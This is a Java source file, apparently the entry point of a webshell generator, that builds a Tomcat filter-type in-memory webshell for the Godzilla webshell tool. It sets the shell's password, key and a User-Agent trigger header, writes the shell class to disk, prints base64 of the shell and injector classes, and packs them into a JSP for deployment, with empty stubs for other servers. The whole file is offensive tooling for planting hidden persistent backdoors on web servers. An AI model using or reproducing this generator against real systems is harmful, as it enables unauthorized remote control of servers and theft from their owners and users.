package com.reajason.javaweb;

import com.reajason.javaweb.config.*;
import com.reajason.javaweb.memsell.packer.JspPacker;
import com.reajason.javaweb.memsell.tomcat.TomcatShell;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class GeneratorMain {
    public static void main(String[] args) throws IOException {
        Server server = Server.TOMCAT;
        ShellTool shellTool = ShellTool.Godzilla;
        String shellType = TomcatShell.FILTER;
        GodzillaShellConfig shellConfig = GodzillaShellConfig.builder()
                .pass("pass")
                .key("key")
                .headerName("User-Agent")
                .headerValue("test")
                .build();
        GenerateResult generateResult = generate(server, shellTool, shellType, shellConfig);
        if (generateResult != null) {
            String shellBytesBase64Str = generateResult.getShellBytesBase64Str();
            String injectorBytesBase64Str = generateResult.getInjectorBytesBase64Str();
            Files.write(Paths.get(shellConfig.getShellClassName() + ".class"), generateResult.getShellBytes());
            System.out.println(shellConfig.getShellClassName() + " : " + shellBytesBase64Str);
            System.out.println(shellConfig.getInjectorClassName() + " : " + injectorBytesBase64Str);
            System.out.println(shellConfig);
            JspPacker jspPacker = new JspPacker();
            String jspContent = new String(jspPacker.pack(generateResult));
            System.out.println(jspContent);
        }
    }

    public static GenerateResult generate(Server server, ShellTool shellTool, String shellType, ShellConfig shellConfig) {
        switch (server) {
            case TOMCAT:
                return TomcatShell.generate(shellTool, shellType, shellConfig);
            case BES:
                break;
            case RESIN:
                break;
            case JETTY:
                break;
            default:
                throw new IllegalArgumentException("Unsupported server");
        }
        return GenerateResult.builder().build();
    }
}